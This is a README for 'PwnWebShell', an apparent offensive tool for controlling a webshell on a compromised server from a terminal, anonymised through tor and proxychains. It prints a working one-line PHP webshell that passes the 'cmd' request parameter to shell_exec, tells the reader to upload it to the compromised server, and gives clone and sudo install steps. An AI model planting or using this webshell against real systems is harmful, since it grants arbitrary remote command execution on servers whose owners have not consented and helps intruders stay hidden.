# PwnWebShell
Tool to facilitate the management of our webshell from a terminal.
All we need, is to upload to the committed server a PHP structure like the following to execute commands:

```
<?php
	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```



**Requirements - curl tor proxychains rlwrap**

`sudo apt install curl tor proxychains-ng rlwrap -y`

<details><summary>Installation</summary>

  
1. `git clone https://github.com/DarkTrojanDev/PwnWebShell.git`


2. `chmod +x pwnwebshell.sh`


3. `sudo rlwrap ./pwnwebshell.sh`
  

